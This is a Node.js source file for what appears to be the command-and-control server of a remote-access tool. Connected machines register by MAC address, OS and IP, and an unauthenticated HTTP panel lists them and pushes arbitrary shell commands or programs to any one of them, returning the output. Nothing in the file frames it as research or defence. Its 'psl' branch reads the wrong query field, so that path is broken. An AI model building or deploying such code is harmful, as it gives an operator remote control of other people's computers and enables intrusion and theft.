const net = require('net');
const http = require('http');
const url = require('url');
const fs = require("fs");

class Client {
    constructor(socket, os, onCommandChange) {
        this.ip = socket.remoteAddress;
        this.port = socket.remotePort;
        this.os = os;
        this.onCommandChange = onCommandChange;
    }

    setCommand(command, onComplete, isPSL = false) {
        this._command = command;
        this.onComplete = result => {
            onComplete(result);
            this.onComplete = null;
        };
        if (typeof this.onCommandChange === "function") {
            this.onCommandChange(command, isPSL);
        }
    }

    getCommand() {
        return this._command;
    }
}

JSON.safeParse = function (str) {
    try {
        return this.parse(str);
    } catch (e) {
        return false;
    }
};

const clients = {};

const socketServer = net.createServer(socket => {
    let mac, client, os;
    socket.on('data', data => {
        let obj = JSON.safeParse(data.toString());
        if (obj) {
            if (obj['type'] === 'init') {
                mac = obj['mac'];
                os = obj['os'];
                client = clients[mac] = new Client(socket, os, (command, isPSL) => {
                    if (!isPSL) socket.write(encodeURI(JSON.stringify({
                        type: "command",
                        command: command,
                    })) + "\n"); else socket.write(encodeURI(JSON.stringify({
                        type: "psl",
                        program: command,
                    })) + "\n");
                });
                console.log("Client " + mac + " connected!\nOS: " + os + "\nIP address: " + client.ip + ":" + client.port + "\n");
            } else if (obj['type'] === "result") {
                if (typeof client.onComplete === "function") {
                    client.onComplete(obj['result']);
                }
            }
        }
    });

    socket.on('end', onEnd);
    socket.on('error', onEnd);

    function onEnd(e) {
        if (e) console.log(e);
        clients[mac] = undefined;
        console.log("Client " + mac + " disconnected!");
    }
});

socketServer.listen(8080);

const httpServer = http.createServer((req, res) => {
    let query = url.parse(req.url, true).query;
    if (query != null) {
        if (typeof query['mac'] !== "undefined") {
            res.writeHead(200, {'Content-Type': 'text/plain'});
            if (clients[query['mac']] !== undefined) {
                if (typeof query['command'] !== "undefined") {
                    clients[query['mac']].setCommand(query['command'], result => res.end(result));
                } else if (typeof query['psl'] !== "undefined") {
                    clients[query['mac']].setCommand(query['command'], result => res.end(result), true);
                } else {
                    res.end("Unknown operation");
                }
            } else {
                res.end('Such mac is not connected');
            }
        } else if (typeof query['clients'] !== "undefined") {
            res.writeHead(200, {'Content-Type': 'text/plain'});
            let obj = [];
            for (let mac in clients) {
                if (clients.hasOwnProperty(mac)) {
                    obj.push({
                        mac: mac,
                        ip: clients[mac].ip,
                        port: clients[mac].port,
                        os: clients[mac].os,
                    });
                }
            }
            res.end(JSON.stringify(obj));
        } else if (typeof query['control'] !== "undefined") {
            res.writeHead(200, {'Content-Type': 'text/html'});
            fs.readFile("index.html", "utf8", (err, data) => {
                if (err) {
                    res.end(err.toString());
                } else {
                    res.end(data.toString());
                }
            });
        } else {
            res.end("fuck you");
        }
    } else {
        res.end("wtf");
    }
});

httpServer.listen(6702);